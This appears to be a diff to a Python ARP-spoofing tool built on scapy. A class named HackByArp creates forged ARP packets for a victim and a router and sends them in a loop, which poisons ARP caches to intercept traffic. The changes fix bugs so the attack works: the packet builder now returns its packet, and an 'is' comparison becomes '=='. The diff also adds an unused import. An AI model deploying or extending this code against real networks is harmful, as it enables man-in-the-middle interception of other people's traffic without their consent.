@@ -1,6 +1,7 @@
 import os
 from json import load, dump
 from abc import ABC, abstractmethod
+from re import A
 from scapy.all import ARP, send, get_if_addr, get_if_hwaddr, getmacbyip
 import getmac
 from time import sleep
@@ -45,6 +46,8 @@ class HackByArp():
         except:
             print('Packet is not created!')
 
+        return arp_packet
+
     def attack(self):
         victim_arp = self.create_packet(self.victim)
         router_arp = self.create_packet(self.router)
@@ -59,8 +62,6 @@ class HackByArp():
                 router_arp = self.create_packet(self.router, self.victim[2])
                 send(victim_arp)
                 send(router_arp)
-                
-
 
 
 class ConfigurationReader(AbstractController):
@@ -96,7 +97,7 @@ class ConfigurationInput(AbstractController):
 
         clear_console()
         save_to_json = input('\n\nDo you want to save this config to json\'s file? [Y/n]\t')
-        if save_to_json is '' or save_to_json.lower()[0] in ['y', 't']:
+        if save_to_json == '' or save_to_json.lower()[0] in ['y', 't']:
             choice = input(
                 '\n\nDo you want to replace [R] the contents of file or append [A] to file? (press another key to cancel saving)\t')
 
